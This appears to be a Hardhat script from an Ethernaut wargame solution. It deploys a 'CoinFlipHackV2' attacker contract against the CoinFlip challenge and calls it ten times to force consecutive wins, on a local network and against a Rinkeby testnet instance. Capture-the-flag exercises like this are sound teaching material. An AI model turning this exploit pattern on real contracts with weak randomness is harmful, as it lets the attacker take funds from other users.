import assert from 'assert';

import { ethers } from 'hardhat';

const main = async () => {
  const ContractFactory = await ethers.getContractFactory('CoinFlipV2');
  const contract = await ContractFactory.deploy();

  const [owner, attacker] = await ethers.getSigners();

  await contract.deployed();
  console.log('Contract deployed to:', contract.address);

  const ContractHack = await ethers.getContractFactory('CoinFlipHackV2');
  const coinflipHack = await ContractHack.deploy(contract.address);
  await coinflipHack.deployed();

  console.log(`Owner address : ${owner.address}`);
  console.log(`Attacker address ${attacker.address}`);
  console.log(`CoinflipHack address : ${coinflipHack.address}`);

  // 1. flip() 10 times
  for (let i = 1; i <= 10; i++) {
    await coinflipHack.flip();
  }

  // 2. Check consecutiveWins
  const consecutiveWins = await contract.consecutiveWins();
  assert(consecutiveWins.toNumber() === 10);
  console.log(`consecutiveWins : ${consecutiveWins}`);
};

// run with --network rinkeby
const submitInstance = async () => {
  const instance = ''; // Get instance from ethernaut console.
  const [owner, attacker] = await ethers.getSigners();

  const ContractHack = await ethers.getContractFactory('CoinFlipHackV2');
  const coinflipHack = await ContractHack.deploy(instance);
  await coinflipHack.deployed();

  console.log(`Owner address : ${owner.address}`);
  console.log(`Attacker address ${attacker.address}`);
  console.log(`CoinflipHack address : ${coinflipHack.address}`);

  // 1. Connect CoinFlip instance to check total wins.
  const abi = [
    'function flip() public',
    'function consecutiveWins() public view returns (uint)'
  ];

  // 2. flip() 10 times.
  for (let i = 1; i <= 10; i++) {
    await coinflipHack.connect(owner).flip();
  }

  // assert(consecutiveWins.toNumber() === 10);
  // console.log('Submit successful.');
};

submitInstance().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});

// main().catch((error) => {
//   console.error(error);
//   process.exitCode = 1;
// });
